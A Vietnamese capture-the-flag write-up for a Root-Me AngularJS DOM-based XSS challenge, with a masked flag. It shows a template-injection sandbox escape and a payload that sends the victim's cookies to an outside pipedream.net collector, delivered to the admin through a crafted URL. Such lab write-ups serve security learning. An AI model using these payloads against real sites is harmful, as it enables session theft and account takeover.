# WRITE UP

**Challenge:** [**XSS DOM Based - Angular**](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-AngularJS)

Thử submit giá vị vào input, ta xem được script mà website handle:

<img src="./media/image1.png" style="width:6.5in;height:3.46597in" alt="Graphical user interface, text, application Description automatically generated" />

Mất khá nhiều thời gian để tránh filter và hiểu code. Có vẻ không thể attack bằng cách “hiểu” code được. Đề bài có tên là **AngularJS,** tra cứu cheatsheet XSS Angular, ta có thể tìm được payload: **$on.constructor('alert(1)')()**

Để khiến JS thực thi command, ta chèn {{ }} để triển khai expression:

**{{$on.constructor('alert(1)')()}}**

Tuy vậy, lúc chèn payload, website trả về:

<img src="./media/image2.png" style="width:6.24127in;height:2.78056in" alt="A screenshot of a computer Description automatically generated" />

Thử thay **' "** thì đã chèn thành công script:

<img src="./media/image3.png" style="width:6.5in;height:1.06319in" alt="A screenshot of a computer Description automatically generated with medium confidence" />

Chỉnh sửa payload để thực thi DOM Based XSS attack. Ta sử dụng **\\"** để thoát chuỗi **"":**

Payload: **{{$on.constructor("document.location=\\"https://eol9dtzbk9673pb.m.pipedream.net?cookie=\\"+document.cookie")()}}**

<img src="./media/image4.png" style="width:5.60752in;height:2.77081in" alt="Graphical user interface, text, application, email Description automatically generated" />

Payload đã chạy được. Giờ thì gửi payload đến admin qua Contact tab:

[*http://challenge01.root-me.org/web-client/ch35/?name={{$on.constructor("document.location=\\"https://eol9dtzbk9673pb.m.pipedream.net?cookie=\\"%20document.cookie")()}}*](http://challenge01.root-me.org/web-client/ch35/?name=%7b%7b$on.constructor(%22document.location=\%22https://eol9dtzbk9673pb.m.pipedream.net?cookie=\%22%20document.cookie%22)()%7d%7d)

<img src="./media/image5.png" style="width:4.37015in;height:1.53329in" alt="Graphical user interface, text, application, website Description automatically generated" />

HTTP Request nhận về:

<img src="./media/image6.png" style="width:6.12427in;height:2.54327in" alt="Graphical user interface, text, application Description automatically generated" />

<img src="./media/image7.png" style="width:5.42995in;height:2.95398in" alt="A screenshot of a computer Description automatically generated" />

\- Flag: \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
